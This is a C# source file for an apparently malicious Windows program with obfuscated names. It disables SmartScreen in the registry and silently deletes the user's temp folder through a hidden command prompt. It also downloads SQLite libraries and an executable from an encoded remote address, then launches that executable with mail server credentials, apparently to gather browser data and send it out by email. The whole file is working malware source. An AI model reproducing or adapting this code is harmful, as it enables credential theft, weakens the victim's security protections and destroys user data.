namespace samsung
{
    using Microsoft.Win32;
    using System;
    using System.Diagnostics;

    internal static class doma
    {
        private static void Main()
        {
            ss4545454();
            if (Process.GetProcessesByName("wsnm").Length <= 0)
            {
                string environmentVariable = Environment.GetEnvironmentVariable("temp");
                new Process { StartInfo = xyz() }.Start();
                string text1 = environmentVariable + @"\" + Environment.UserName + ".html";
                string str2 = vgf.cbxfgfbgwes() + ".exe";
                string str3 = vgf.cbxfgfbgwes();
                string str4 = string.Concat(new object[] { environmentVariable, '\\', str3, '\\' });
                string str5 = vgf.tre(afa.mail_otpr35215252);
                string str6 = vgf.tre(afa.mail_pass3525564235);
                string str7 = vgf.tre(afa.mail_polu353653543);
                string str8 = vgf.tre(afa.mail_otpr35215252);
                string str9 = vgf.tre(AMV.DontKillMe(vgf.tre(afa.ssilka526525724))).Replace(':', ';');
                str5 = str8 = str9.Split(new char[] { ';' })[0];
                str6 = str9.Split(new char[] { ';' })[1];
                string str10 = vgf.tre(afa.mail_ru_ru_serv35264235);
                string[] strArray = new string[] { str4, str4 + @"x64\", str4 + @"x86\" };
                foreach (string str11 in strArray)
                {
                    vgf.fefqeefqf(str11);
                }
                string[] strArray2 = new string[] { "x86/SQLite.Interop.dll", "x64/SQLite.Interop.dll", "System.Data.SQLite.dll", "Ionic.Zip.dll" };
                foreach (string str12 in strArray2)
                {
                    vgf.gwredngr(str4 + str12, vgf.qrqwer() + "com/" + str12);
                }
                vgf.gwredngr(str4 + str2, vgf.qrqwer() + "com/zip");
                string arguments = string.Concat(new object[] { str10, ' ', afa.mail_ru_ru_port6423464624, ' ', str5, ' ', str6, ' ', str8, ' ', str7, ' ', afa.subject, ' ', afa.budi });
                Process.Start(str4 + str2, arguments);
            }
        }

        private static bool ss4545454()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true);
            try
            {
                if (key.GetValue("SmartScreenEnabled") != null)
                {
                    key.SetValue("SmartScreenEnabled", "Off");
                }
                key.Close();
                key.Dispose();
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static ProcessStartInfo xyz()
        {
            return new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/C rd /s /q %temp% ", WindowStyle = ProcessWindowStyle.Hidden };
        }
    }
}

